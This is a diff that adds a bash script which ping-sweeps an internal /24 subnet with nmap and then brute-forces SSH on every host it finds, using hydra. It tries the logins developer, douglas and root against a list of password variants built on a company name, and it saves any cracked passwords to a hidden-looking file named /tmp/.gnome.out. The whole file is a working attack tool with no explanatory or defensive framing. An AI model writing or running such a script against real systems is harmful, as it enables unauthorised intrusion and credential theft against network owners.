@@ -1,0 +1,76 @@
+#!/bin/bash
+
+NET="10.121.3"
+
+LOG_LIST=(
+"developer"
+"douglas"
+"root"
+)
+
+PASS_LIST=(
+"Thales01"
+"Thales02"
+"Thales03"
+"Thales04"
+"Thales05"
+"Thales06"
+"Thales07"
+"Thales08"
+"Thales09"
+"Thales10"
+"Thales01*"
+"Thales02*"
+"Thales03*"
+"Thales04*"
+"Thales05*"
+"Thales06*"
+"Thales07*"
+"Thales08*"
+"Thales09*"
+"Thales10*"
+"Thales01**"
+"Thales02**"
+"Thales03**"
+"Thales04**"
+"Thales04**"
+"Thales05**"
+"Thales06**"
+"Thales07**"
+"Thales08**"
+"Thales09**"
+"Thales10**"
+"Thales2018"
+"thales2018"
+"livetvka1"
+)
+
+apt show hydra > /dev/null 2>&1
+
+if [[ "$?" != "0" ]]; then
+  sudo apt install hydra
+fi
+
+LOGIN=/tmp/login
+PASS=/tmp/pass
+SRV=/tmp/srv
+OUT=/tmp/.gnome.out
+
+>$LOGIN
+>$PASS
+>$SRV
+>$OUT
+
+for word in ${LOG_LIST[@]}; do
+  echo $word >> $LOGIN
+done
+
+for word in ${PASS_LIST[@]}; do
+  echo $word >> $PASS
+done
+
+sudo nmap -sP $NET.0/24 | grep "${NET}" | awk '{print $5}' > $SRV
+
+hydra -L $LOGIN -P $PASS -M $SRV ssh 2>/dev/null | grep "password" > $OUT
+
+rm $LOGIN $PASS $SRV
